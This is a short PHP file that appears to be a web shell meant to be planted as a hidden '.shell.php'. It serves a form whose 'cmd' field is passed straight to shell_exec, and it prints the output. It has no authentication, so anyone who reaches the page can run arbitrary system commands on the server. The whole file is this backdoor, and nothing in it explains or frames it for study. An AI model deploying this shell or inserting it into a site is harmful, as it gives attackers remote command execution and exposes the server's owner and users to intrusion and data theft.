<?php

$cmd = '';
if (isset($_POST['cmd'])){
	$cmd = $_POST['cmd'];
}
$top_html = "<html>
				<head>
				<body>
				<form name='test' method=POST action='.shell.php'>
					<input type='text' name='cmd' size='25' />
					<input type='submit'name='submit'value='Submit' />
				</form>";
$bottom_html= "</body>
		</html>";
if ($cmd <> '') {
	function queryOutput() {
		global $cmd;
		$output = shell_exec($cmd);
		echo "<pre>$output</pre>";
	}
	echo $top_html;
	queryOutput();
	echo $bottom_html;
} else {
	echo $top_html . $bottom_html;
}

?>
